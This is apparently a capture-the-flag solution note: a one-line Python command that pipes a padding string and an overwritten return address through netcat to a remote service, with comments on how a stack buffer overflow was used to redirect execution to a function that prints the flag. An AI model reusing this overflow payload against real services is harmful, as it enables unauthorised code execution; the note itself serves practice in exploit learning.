python -c 'print “A”*63 + “\xcc\x86\x04\x08”’ | nc addr port

# Used trial and error to find 67 bytes overflowed to a return address
# that got loaded into eip. Used disassembler to see there was a method that 
# called cat ./flag and got its address 0x080486cc . Overflowed eip with address
# of the cat ./flag method. I think this was supposed to be done differently 
# because of the address given in the start.
